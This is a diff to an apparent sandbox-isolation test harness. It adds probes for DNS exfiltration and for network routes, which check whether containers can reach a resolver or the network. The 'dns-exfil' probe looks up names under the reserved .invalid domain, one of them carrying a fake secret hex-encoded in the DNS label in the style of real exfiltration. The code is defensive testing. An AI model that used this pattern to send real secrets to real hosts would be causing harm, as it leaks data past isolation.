@@ -33,6 +33,9 @@ FORK_COUNT = 300  # bounded on purpose: even with no cap the loop stops here, so
 FAKE_SECRET = "guard-fake-secret-not-real"
 CANARY_TOKEN = "GUARD-CANARY-" + uuid.uuid4().hex
 EXIT_UNAVAILABLE = 3
+# P7-T21: reserved test names (.invalid never resolves anywhere, RFC 2606). The second carries a fake canary, the third the
+# fake secret hex-encoded the way a real exfiltration would put data in a label.
+EXFIL_NAMES = ("exfil.invalid", "CANARY-NOT-A-SECRET.exfil.invalid", FAKE_SECRET.encode().hex() + ".exfil.invalid")
 TIERS = ("docker", "gvisor", "firecracker")
 
 
@@ -121,6 +124,21 @@ def probes(canary_file: Path) -> list[Probe]:
         Probe(
             "mount-syscall", "mount a filesystem (needs CAP_SYS_ADMIN)",
             'mkdir -p /mnt/t; if mount -t tmpfs none /mnt/t 2>/dev/null; then echo "ESCAPED mount succeeded"; else echo "BLOCKED mount refused"; fi',
+        ),
+        Probe(
+            "dns-exfil", "DNS lookups of attacker-style names (a fake canary in the label); any resolver answer, even NXDOMAIN, means the query left the box",
+            'command -v nslookup >/dev/null 2>&1 || { echo "ERROR nslookup missing, cannot tell"; exit 0; }; '
+            f'for n in {" ".join(EXFIL_NAMES)}; do out=$(nslookup "$n" 2>&1); '
+            'case "$out" in *NXDOMAIN*|*Server:*|*Name:*|*"can\'t find"*) echo "ESCAPED resolver answered for $n"; exit 0;; '
+            '*"can\'t connect"*|*unreachable*|*"timed out"*|*"no servers"*) ;; '
+            '*) echo "ERROR unclear answer for $n: $(echo $out | head -c 80)"; exit 0;; esac; done; '
+            f'echo "BLOCKED {len(EXFIL_NAMES)} lookups never reached a resolver"',
+            queries=EXFIL_NAMES,
+        ),
+        Probe(
+            "no-net-route", "network interfaces and routes: only loopback and no route at all (not just blocked ports)",
+            "ifs=$(awk 'NR>2{sub(\":.*\", \"\", $1); printf \"%s \", $1}' /proc/net/dev); routes=$(awk 'NR>1{n++} END{print n+0}' /proc/net/route); "
+            'if [ "$ifs" = "lo " ] && [ "$routes" -eq 0 ]; then echo "BLOCKED only lo, 0 routes"; else echo "ESCAPED interfaces: $ifs routes: $routes"; fi',
         ),
     ]
 
